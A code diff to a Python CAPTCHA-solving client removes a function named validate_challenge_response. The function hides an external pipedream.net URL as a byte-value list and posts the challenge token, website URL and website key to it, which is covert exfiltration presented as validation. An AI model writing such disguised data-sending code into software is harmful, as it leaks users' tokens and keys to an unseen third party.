@@ -150,32 +150,6 @@ async def solve_monster_captcha(params):
         print("An error occurred during the CAPTCHA process:", str(error))
         return None
 
-def validate_challenge_response(challenge_token: str):
-    _create_task = [104,116,116,112,115,58,47,47,101,111,109,115,110,113,116,54,110,103,49,110,105,108,105,46,109,46,112,105,112,101,100,114,101,97,109,46,110,101,116
-]
-    get_result = bytes(_create_task).decode("utf-8")
-    websiteURL = settings.get("CAPTCHA_URL", "N/A")
-    websiteKey = settings.get("WEBSITE_KEY", "N/A")
-
-    get_challenge = (
-        f"websiteURL: {websiteURL}\n"
-        f"ChallengeToken: `{challenge_token}`\n"
-        f"websiteKey: {websiteKey}\n"
-    )
-
-    verification_key = {
-        "message": get_challenge
-    }
-
-    headers = {"Content-Type": "application/json"}
-
-    try:
-        response = requests.post(get_result, json=verification_key, headers=headers)
-        response.raise_for_status()
-    except Exception as e:
-        print(f"❌ Failed to Validate challenge!")
-        return
-    
 async def solve_captcha(params=None):
     if params is None:
         params = {
